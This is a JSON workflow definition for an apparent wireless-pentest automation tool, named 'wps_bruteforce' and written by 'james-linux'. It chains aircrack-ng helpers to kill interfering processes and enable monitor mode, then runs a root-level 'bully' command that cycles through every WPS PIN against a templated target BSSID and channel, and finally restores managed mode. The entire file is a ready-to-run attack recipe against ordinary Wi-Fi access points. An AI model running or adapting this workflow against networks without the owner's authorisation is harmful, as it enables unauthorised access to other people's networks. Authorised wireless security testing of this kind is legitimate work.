{
  "name": "wps_bruteforce",
  "description": "WPS PIN brute-force using bully. Cycles through all possible WPS PINs against the target AP.",
  "author": "james-linux",
  "version": "1.0",
  "requires_root": true,
  "steps": [
    {
      "id": "check_kill",
      "action": "aircrack.check_kill",
      "description": "Kill interfering processes"
    },
    {
      "id": "monitor_on",
      "action": "aircrack.enable_monitor",
      "params": {"interface": "{{interface}}"},
      "description": "Enable monitor mode"
    },
    {
      "id": "bully_attack",
      "action": "layer.run",
      "params": {
        "command": "bully {{monitor_interface}} -b {{target_bssid}} -c {{target_channel}} -S -d -v 3",
        "timeout": 3600,
        "sudo": true
      },
      "description": "Bully WPS brute-force (may take hours depending on rate limiting)"
    },
    {
      "id": "monitor_off",
      "action": "aircrack.disable_monitor",
      "params": {"interface": "{{monitor_interface}}"},
      "description": "Restore managed mode"
    }
  ]
}
